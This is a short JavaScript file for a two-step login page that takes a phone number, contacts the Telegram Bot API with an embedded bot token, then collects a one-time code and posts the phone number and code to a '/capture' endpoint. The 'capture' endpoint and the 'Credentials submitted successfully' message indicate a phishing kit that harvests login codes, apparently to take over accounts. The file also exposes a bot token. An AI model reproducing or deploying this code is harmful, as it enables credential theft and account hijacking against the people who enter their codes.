if (document.getElementById('login-form')) {
    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault();
        
        const phoneNumber = document.getElementById('phone-number').value;

        // Make a request to Telegram's API to send an OTP
        fetch('https://api.telegram.org/bot7582058238:AAEbygzj6yvZ52SLh6AM2a9Sr4K6IcrBGr4/sendMessage', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: phoneNumber, // Assuming phoneNumber is the chat ID
                text: 'Please enter the OTP sent to your phone.'
            })
        })
        .then(response => {
            if (response.ok) {
                // Redirect to OTP input page, passing the phone number as a query parameter
                window.location.href = 'otp.html?phone=' + encodeURIComponent(phoneNumber);
            } else {
                throw new Error('Failed to send OTP');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error sending OTP. Please try again.');
        });
        
    });
} else if (document.getElementById('otp-form')) {
    // Handle OTP submission
    document.getElementById('otp-form').addEventListener('submit', function(event) {
        event.preventDefault(); 
        
        // Get the values input by the user
        const phoneNumber = new URLSearchParams(window.location.search).get('phone'); // Retrieve phone number from URL
        const otpCode = document.getElementById('otp-code').value;

        // Create the data object to send to the server
        const data = {
            phoneNumber: phoneNumber,
            otpCode: otpCode
        };

        fetch('http://localhost:3000/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                return response.json();
            }
            throw new Error('Failed to submit OTP');
        })
        .then(result => {
            alert('Credentials submitted successfully');
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error submitting credentials');
        });
    });
}
